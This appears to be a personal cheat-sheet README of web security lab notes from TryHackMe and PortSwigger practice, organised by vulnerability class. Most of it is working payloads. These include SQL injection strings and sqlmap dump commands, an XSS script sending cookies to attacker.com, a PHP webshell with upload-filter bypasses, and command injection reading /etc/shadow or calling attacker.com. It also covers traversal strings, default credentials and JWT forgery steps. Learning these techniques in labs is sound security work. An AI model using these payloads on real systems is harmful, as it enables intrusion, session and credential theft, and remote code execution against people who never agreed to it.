# 🕸️ Web Security Lab — Notes, Techniques & Methodology

Personal web application security lab documentation. Built through TryHackMe rooms, PortSwigger Web Security Academy labs, and CTF challenges. Covers the most common web vulnerabilities with real payload examples and exploitation methodology.

> **Top 6% on TryHackMe** · 88+ rooms completed · Active on PortSwigger Web Academy

---

## Table of Contents

- [SQL Injection](#sql-injection)
- [Cross-Site Scripting (XSS)](#cross-site-scripting)
- [Insecure Direct Object Reference (IDOR)](#idor)
- [File Upload Vulnerabilities](#file-upload)
- [Command Injection](#command-injection)
- [Directory Traversal](#directory-traversal)
- [Authentication Bypass](#authentication-bypass)
- [Recon Methodology](#recon-methodology)
- [Tools Reference](#tools-reference)

---

## SQL Injection

### Detection
```
'         -- syntax error = likely injectable
''        -- escaped quote = probably not injectable
' OR '1   -- boolean test
```

### Classic Union-Based
```sql
-- Step 1: Find number of columns
' ORDER BY 1-- -
' ORDER BY 2-- -    -- keep incrementing until error

-- Step 2: Find which column reflects in output
' UNION SELECT NULL,NULL-- -
' UNION SELECT 'a',NULL-- -

-- Step 3: Extract data
' UNION SELECT username,password FROM users-- -
```

### Blind Boolean-Based
```sql
-- True condition (page loads normally)
' AND 1=1-- -

-- False condition (page changes / breaks)
' AND 1=2-- -

-- Extract data char by char
' AND SUBSTRING(username,1,1)='a'-- -
```

### Error-Based (MySQL)
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -
```

### SQLMap (for legal lab use)
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
```

---

## Cross-Site Scripting

### Reflected XSS — Detection
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
```

### Stored XSS — Cookie Theft
```html
<script>
  fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```

### Filter Bypass Techniques
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- No closing tag needed -->
<img src=x onerror=alert`1`>

<!-- SVG-based -->
<svg onload=alert(1)>

<!-- Encoded -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- When brackets filtered -->
<img src=x onerror=alert(1) >
```

### DOM-Based XSS
```javascript
// Vulnerable sink:
document.getElementById('output').innerHTML = location.hash.slice(1);

// Payload in URL:
https://target.com/page#<img src=x onerror=alert(1)>
```

---

## IDOR

### What to Look For
- Numeric IDs in URLs: `/profile?id=1337`
- GUIDs in API responses: `/api/orders/uuid-here`
- Base64-encoded references: `eyJ1c2VyIjogMX0=` → `{"user": 1}`
- Indirect references: filenames, email parameters

### Methodology
```
1. Login as user A → note all IDs in requests
2. Login as user B → attempt to access user A's IDs
3. Test: GET /api/user/1 while authenticated as user 2
4. Test: POST /api/update with another user's ID in body
5. Test: indirect refs — change filename param to another user's document
```

### Burp Suite Workflow
```
1. Capture request with your own ID
2. Send to Repeater (Ctrl+R)
3. Modify the ID parameter
4. Forward and check response
5. Compare response body/size — identical structure = likely IDOR
```

---

## File Upload

### Bypass Techniques

**Client-side validation only:**
```
1. Intercept with Burp
2. Change filename in request: shell.php
3. Forward — server may not revalidate
```

**MIME type bypass:**
```
Content-Type: image/jpeg   ← change from application/x-php
[actual PHP payload in body]
```

**Extension bypass:**
```
shell.php.jpg   ← double extension
shell.pHp       ← case variation
shell.php3      ← legacy extension
shell.phtml     ← alternative PHP extension
shell.shtml
```

**PHP webshell payload:**
```php
<?php system($_GET['cmd']); ?>
```

Test with: `http://target.com/uploads/shell.php?cmd=id`

**Magic bytes trick:**
```
GIF89a;
<?php system($_GET['cmd']); ?>
```
Change Content-Type to `image/gif` — bypasses MIME check.

---

## Command Injection

### Detection
```bash
; id
| id
|| id
`id`
$(id)
& id
&& id
```

### Common Payloads
```bash
; cat /etc/passwd
| whoami
; ls -la /
$(cat /etc/shadow)
```

### Blind Command Injection (time-based)
```bash
; sleep 10
| ping -c 10 127.0.0.1
```

### Blind — Out-of-Band
```bash
; curl http://attacker.com/$(whoami)
; nslookup $(hostname).attacker.com
```

---

## Directory Traversal

### Basic
```
../../../../etc/passwd
```

### Encoded Bypass
```
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd     ← double encoded
```

### Null Byte (older PHP)
```
../../../etc/passwd%00.jpg
```

### Windows Targets
```
..\..\..\..\windows\win.ini
..\..\..\boot.ini
```

---

## Authentication Bypass

### SQL Injection Login
```sql
admin'-- -         → username field
' OR 1=1-- -       → password field
```

### Default Credentials
```
admin:admin
admin:password
root:root
admin:123456
```

### JWT Manipulation (with jwt.io)
```
1. Decode token at jwt.io
2. Change "role": "user" → "role": "admin"
3. Change algorithm to "none"
4. Remove signature
5. Forward modified token
```

---

## Recon Methodology

### Passive
```bash
# Subdomain enum (passive)
subfinder -d target.com
amass enum -passive -d target.com

# Certificate transparency
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'

# Wayback Machine
waybackurls target.com | tee wayback.txt
```

### Active
```bash
# Directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# Feroxbuster (recursive)
feroxbuster --url http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt

# Parameter fuzzing
ffuf -u http://target.com/page?FUZZ=value -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Virtual host fuzzing
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

## Tools Reference

| Tool | Purpose | Common Use |
|---|---|---|
| Burp Suite | HTTP proxy / interceptor | Catch, modify, replay requests |
| Gobuster | Directory/subdomain brute force | `gobuster dir -u URL -w wordlist` |
| Feroxbuster | Recursive directory brute force | Finds nested paths |
| ffuf | Fast web fuzzer | Parameter/vhost/dir fuzzing |
| SQLMap | SQL injection automation | Legal lab environments only |
| Nmap | Port/service scanning | `nmap -sV -sC -oA output target` |
| Wireshark | Packet capture/analysis | Network traffic inspection |
| Nikto | Web vulnerability scanner | Quick surface scan |

---

## Resources

- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — best free web security course
- [TryHackMe](https://tryhackme.com/p/Sayrex01) — hands-on guided labs
- [HackTricks](https://book.hacktricks.xyz) — comprehensive technique reference
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — payload collections

---

*By [Ilyass Benfdil](https://github.com/Sayrex01) · Built through real lab practice*
